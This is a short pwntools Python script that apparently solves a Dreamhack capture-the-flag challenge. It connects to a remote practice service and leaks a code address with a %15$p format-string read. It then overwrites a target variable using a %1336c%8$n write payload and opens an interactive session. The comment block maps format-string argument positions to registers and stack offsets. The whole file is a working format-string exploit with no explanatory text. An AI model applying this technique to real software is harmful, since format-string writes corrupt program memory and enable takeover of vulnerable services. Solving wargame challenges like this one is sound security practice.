from pwn import *

port = 14055
rem = remote("host3.dreamhack.games", port)

def slog(name, addr): return success(': '.join([name, hex(addr)]))

'''
%1$p : rdi
%2$p : rdx
%3$p : rcx
%4$p : r8
%5$p : r9
%6$p : rsp
%7$p : rsp + 8
%8$p : rsp+16
%9$p : rsp+24
%10$p : rsp+32
%11$p : rsp+40
%12$p : rsp+48
%13$p : rsp+56
%14$p : rsp+64
%15$p : rsp+72 main
'''

payload = b'"%15$p"'
rem.send(payload)
main_base = int(rem.recvline().rstrip()[3:-1].decode(), 16)
changeme_addr = main_base + 102 + 0x2d23

slog("main", main_base)
slog("var", changeme_addr)

payload = b'"%1336c%8$nAAAA"'
payload += p64(changeme_addr)
rem.send(payload)
rem.recvline().rstrip()

rem.interactive()